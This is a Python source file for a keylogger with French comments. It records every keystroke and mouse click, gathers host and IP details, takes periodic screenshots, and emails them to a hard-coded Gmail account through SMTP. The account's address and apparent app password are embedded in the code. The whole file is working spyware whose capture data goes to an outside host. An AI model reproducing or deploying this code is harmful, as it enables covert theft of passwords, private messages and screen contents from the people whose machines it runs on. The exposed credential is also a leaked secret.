import smtplib
import threading
import socket
import platform
from pynput.keyboard import Listener as keyListener
from pynput.mouse import Listener as mouseListener
import time
import os
import pyscreenshot
import tempfile
from email.mime.text import MIMEText              
from email.mime.multipart import MIMEMultipart  
from email.mime.image import MIMEImage

class KeyLogger:

        def __init__(self, time_interval):
            self.interval = time_interval
            # Buffer de touches tapées
            self.log = "\nKeyLogger Started..."
            self.email = "exporttest511@gmail.com"
            self.password = "acuvebwzoanvcvfc"

        # Méthode appelée lors du mouvement de la souris
        def on_click(self, x, y, button, pressed):
            current_click = "Mouse button {} clicked at {} {}\n".format(button, x, y)
            self.addToLog(current_click)

        # Conversion de la touche en string
        def addKeyToLog(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = "SPACE"
                elif key == key.esc:
                    current_key = "ESC"
                else:
                    current_key = " " + str(key) + " "

            self.addToLog(current_key)

        def addToLog(self, string):
            if string != None:
                self.log = self.log + string

        # Envoi d'un message par courriel
        def send_mail(self):
            try:
                msg = MIMEMultipart()
                msg['From'] = self.email
                msg['To'] = self.email  
                msg['Subject'] = "Keylogger Report"
                text = "Report From: " + socket.gethostbyname(socket.gethostname()) + "\n" 
                msg.attach(MIMEText(text))
                msg.attach(MIMEText("\n" + self.log.strip()))

                with open(tempfile.gettempdir() + '/screenshot.png', 'rb') as f:
                    data = f.read()

                img = MIMEImage(data, name="screenshot.png")
                img.add_header('Content-Disposition', 'attachment; filename="%s"' % "screenshot.png")
                msg.attach(img)

                smtp = smtplib.SMTP(host="smtp.gmail.com", port= 587) 
                smtp.starttls()
                smtp.login(self.email, self.password)
                smtp.sendmail(self.email, self.email, msg.as_string())
                smtp.close()
            except Exception as e:
                print(e)

        # Envoi périodique et reset du buffer de touches
        def report(self):
            self.log = "\n\n" + self.log
            self.screenshot()
            self.send_mail()
            self.log = ""
            self.initTimer()

        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.addToLog("\n" + hostname + " " + ip + " " + plat + " " + system + " " + machine)

        # Envoi du screenshot au moment
        def screenshot(self):
            try:
                os.remove(tempfile.gettempdir() + '/screenshot.png')
            except Exception as e:
                pass
            pyscreenshot.grab().save(tempfile.gettempdir() + "/screenshot.png")

        def initTimer(self):
            self.timer = threading.Timer(self.interval, self.report)
            self.timer.start()

        def run(self):
            # Envoi du message de départ
            self.system_information()
            self.report()
            keyboard_listener = keyListener(on_press=self.addKeyToLog)
            mouse_listener = mouseListener(on_click=self.on_click)
            keyboard_listener.start()
            mouse_listener.start()
            while True:
                time.sleep(self.interval)